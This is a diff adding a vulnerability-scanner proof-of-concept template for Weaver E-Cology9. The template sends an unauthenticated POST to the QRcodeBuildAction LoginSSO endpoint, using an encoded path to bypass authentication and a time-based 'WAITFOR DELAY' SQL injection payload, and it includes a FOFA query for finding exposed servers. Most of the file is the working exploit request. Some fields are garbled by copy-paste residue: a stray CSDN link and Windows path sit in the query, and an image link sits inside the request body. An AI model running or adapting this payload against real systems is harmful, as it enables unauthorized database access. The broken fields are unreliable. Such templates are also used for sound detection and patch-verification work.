@@ -1,0 +1,31 @@
+id: poc-hguuk1kt4zv6gtbq
+info:
+  name: 泛微E-Cology9 QRcodeBuildAction LoginSSO身份认证绕过导致SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hguuk1kt4zv6gtbq'
+  tags: sqli,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hguuk1kt4zv6gtbq
+    fofa: app="泛微-[OA](https://so.csdn.net/so/search?q=OA&spm=1001.2101.3001.7020" \t "C:/Users/xiaolei/Downloads/_blank)（e-cology）"
+http:
+- raw:
+  - 'POST /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+    modeid=127+WAITFOR+DELAY+''0%3a0%3a5''
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731289033980-257efbf3-4ab2-46ea-a479-507e43159ba5.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
